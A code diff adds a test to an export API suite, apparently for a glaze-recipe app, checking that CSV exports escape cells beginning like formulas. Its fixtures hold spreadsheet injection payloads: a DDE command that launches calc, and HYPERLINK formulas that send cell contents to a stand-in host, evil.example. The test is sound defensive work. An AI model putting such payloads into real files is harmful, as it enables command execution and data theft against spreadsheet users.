@@ -209,6 +209,53 @@ describe('export API', () => {
     expect(text(await get('/export/materials.csv', bob.token))).to.not.include('cmd');
   });
 
+  it('keeps every cell that starts like a formula as text: lists too, and a minus unless the cell is a number', async () => {
+    const carol = await makeUser();
+    const ownedBy = String(carol.user._id);
+    const calc = "=cmd|' /C calc'!A0";
+    await Recipe.create({
+      title: '-1+HYPERLINK("https://evil.example/?"&A1,"Click")',
+      ownedBy,
+      date: '@SUM(1,1)',
+      notes: ['=HYPERLINK("https://evil.example","x")', 'second'],
+      materials: [
+        { name: calc, amount: "-2+3+cmd|' /C calc'!A0" },
+        { name: 'Silica', amount: '-2' },
+        { name: 'Whiting', amount: '-0.5' },
+        { name: '\tTab', amount: '-.5' }
+      ]
+    });
+    await Material.create({
+      name: 'M',
+      ownedBy,
+      rawformula: '-SiO2',
+      fields: [{ name: '=1+1', amount: '1' }],
+      notes: ['=2+2'],
+      relatedTo: ['+3+3'],
+      equivalent: 1,
+      formulaweight: 1,
+      loi: -1,
+      molecularweight: 1,
+      percentmole: 'percent'
+    });
+    const rows = async (path: string) =>
+      text(await get(path, carol.token))
+        .replace('﻿', '')
+        .trim()
+        .split('\r\n')
+        .slice(1);
+    const recipe = `"'-1+HYPERLINK(""https://evil.example/?""&A1,""Click"")","'@SUM(1,1)","'=HYPERLINK(""https://evil.example"",""x""); second"`;
+    expect(await rows('/export/recipes.csv')).to.eql([
+      `${recipe},Material,'${calc},'-2+3+cmd|' /C calc'!A0,,,,`,
+      // A number with a minus is a number: it stays one.
+      `${recipe},Material,Silica,-2,,,,`,
+      `${recipe},Material,Whiting,-0.5,,,,`,
+      `${recipe},Material,'\tTab,-.5,,,,`
+    ]);
+    // The lists (related to, notes, the analysis) are checked once joined; a number field stays a number.
+    expect(await rows('/export/materials.csv')).to.eql(["M,'-SiO2,'+3+3,'=2+2,'=1+1 1,percent,-1,1,1,1"]);
+  });
+
   it('lets a trial export too, with the trial in place of an address', async () => {
     const started = await api().post('/guest');
     const token = sessionToken(started)!;
